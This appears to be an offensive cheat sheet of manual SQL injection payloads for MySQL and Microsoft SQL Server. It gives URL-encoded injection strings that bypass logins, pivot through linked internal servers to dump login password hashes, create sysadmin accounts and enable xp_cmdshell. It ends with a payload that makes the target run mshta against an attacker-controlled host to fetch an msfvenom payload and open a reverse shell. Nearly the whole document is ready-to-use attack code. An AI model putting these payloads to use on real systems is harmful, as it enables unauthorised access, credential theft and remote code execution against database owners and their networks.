Manual MYSQL INJECTION Queries
-----------------------------
|
 -> Normal Blind Sql Injection
    UNION ALL SELECT NULL,(SELECT CONCAT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM information_schema.schemata LIMIT x,x),NULL,NULL-- w4fz5uck5

    Time-Based SQL Injection
    AND IF(SUBSTRING(version(),1,1)=CHAR(666), sleep(2), 'false')-- w4fz5uck5

    Login using whatever username:
      admin' OR 1=1-- -
      james' OR 1=1-- -
      jessica' OR 1=1-- -
      .....

MSSQL LINKED SERVER CONNECTION:
     https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf
     https://blog.netspi.com/wp-content/uploads/2017/05/Technical-Article-Hacking-SQL-Server-Database-Links-Setup-and-Attack-Guide.pdf
    
    CREATE USER:
         Create Users  EXEC sp_addlogin 'user', 'pass'; -- priv
         Drop Users  EXEC sp_droplogin 'user'; -- priv
         Make User DBA  EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin; -- priv
         
ADVANCED MSSQL INJECTION:
--------------------------------

List internal databases:
Example machines:
192.168.0.103 -> SQL Injection machine 

Query:
192.168.0.103 -> SELECT srvname from master.sys.sysservers
--------------------------------

List internal databases from an internal database:
Example machines:
192.168.0.103 -> SQL Injection machine 
192.168.0.102 -> Another Internal MSSQL DB

Query:
192.168.0.103 -> SELECT srvname from [192.168.0.102].master.sys.sysservers
--------------------------------

Executing SA (System Administrator) commands without any password:
1 - Let's then you got a SQL Injection but you haven't sysadmins privileges, you can also connect trough
OPENQUERY in another machines and perform code execution with rights presents on there, if "sa" is logged by default, you can run
SA SQL Commands! ;)

2 - The command below will extract accounts informations through "sa" user located in another Internal (linked) Database ;)

Example machines:
192.168.0.103 -> SQL Injection machine 
192.168.0.102 -> Another Internal MSSQL DB

Query:
192.168.0.103 -> SELECT name,password_hash from [192.168.0.102].master.sys.sql_logins
--------------------------------

Get Linked Server Outputs:

1 - Linked  Servers outputs could be problematics when you are thinking about outputs.. the best way to that is placing the output
inside a table, then reading it after query execution:

2 - In the example below we are creating some table which will store our data!

Example machines:
192.168.0.103 -> SQL Injection machine 
192.168.0.102 -> First OPENQUERY()
192.168.0.101 -> Second Internal MSSQL DB

Query:
192.168.0.103 -> '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENQUERY([192.168.0.102],''SELECT+srvname+FROM+[192.168.0.101].master.sys.sysservers'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ

3 - Now it's time to get the output :p
Example machines:
192.168.0.103 -> SQL Injection machine

Query:
192.168.0.103 -> SELECT * FROM dbo.w4fz
--------------------------------

GIMME MA REVERSE SHELL !!!

xp_cmdshell AND show advanced options functions, must to be activated in order to make MSSQL execute commands. By default, they're not! :( ... but, if you're lucky, AND sysadmin, you can be able to reactivate it! :D

True = 1
False = 0

=====Reactivating Show Advanced Options Func=====
show advanced options = True:
OPENROWSET() 

Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 
uid -> user with SYSADMIN permission
pass -> user password

Query:
192.168.0.103 -> '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENROWSET(''SQLOLEDB'',''server=[192.168.0.102];uid=<USER>;pwd=<PASS>'',''USE+MASTER;SET+FMTONLY+OFF+EXECUTE+sp_configure+''''show+advanced+options'''',1;RECONFIGURE+WITH+OVERRIDE'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ

=====ANOTHER METHOD=====
show advanced options = True:
OPENQUERY()

Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 

Query:
192.168.0.103 -> '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENQUERY([192.168.0.102],''SET+FMTONLY+OFF+EXECUTE+sp_configure+''''show+advanced+options'''',1;RECONFIGURE+WITH+OVERRIDE'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ
--------------------------------

xp_cmdshell = True:
OPENROWSET() 

Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 
uid -> user with SYSADMIN permission
pass -> user password

Query:
192.168.0.103 -> 
'+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENR OWSET(''SQLOLEDB'',''server=[192.168.0.102];uid=<USER>;pwd=<PASS>'',''SET+FMTONLY+OFF+EXECUTE+sp_configure+''''xp_cmdshell'''',1;RECONFIGURE+WITH+OVERRIDE'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ

====ANOTHER METHOD====
xp_cmdshell = True:
OPENQUERY()

Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 

Query:
192.168.0.103 -> '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENQUERY([192.168.0.102],''SET+FMTONLY+OFF+EXECUTE+sp_configure+''''xp_cmdshell'''',1;RECONFIGURE+WITH+OVERRIDE'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ
--------------------------------

Check if xp_cmdshell or show advanced options is True or False:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> SA (System Adminsitrator) Internal MSSQL DB 

Query:
192.168.0.103 -> select CAST(value_in_use AS INT) FROM [192.168.0.102].master.sys.configurations where name = "show advanced options"
192.168.0.103 -> select CAST(value_in_use AS INT) FROM [192.168.0.102].master.sys.configurations where name = "xp_cmdshell"

If the return is '1' in both... then you can perform remote code execution on the target host.
--------------------------------

Execute our xp_cmdshell:
Example machines:
192.168.0.103 -> SQL Injection machine
192.168.0.102 -> Host with xp_cmdshell and show advanced options == True (1)

1 - Create  hta-psh (index.html) payload with msfvenom. 
2 - After that, list it in your python webserver then utilize "mshta" command in your target machine in order to get rev shell!
3 - mshta http://<IP> -> will access your webserver host and execute index.html file, then send you a rev shell!

Query:
192.168.0.103 - > '+DROP+TABLE+w4fz;CREATE+TABLE+w4fz(id+INT+PRIMARY+KEY+IDENTITY,+data+NVARCHAR(4000));DECLARE+@q+varchar(8000);SELECT+@Q+=+'SELECT+*+FROM+OPENQUERY([<ANOTHER_INTERNAL_DB>],''SET+FMTONLY+OFF+EXECUTE+xp_cmdshell+''''mshta+http://<IP>'''';'')';INSERT+INTO+w4fz+EXEC+(@Q);WAITFOR+DELAY+'0:0:5'+--+VtfJ
--------------------------------

#TODO
         
         
TODO#
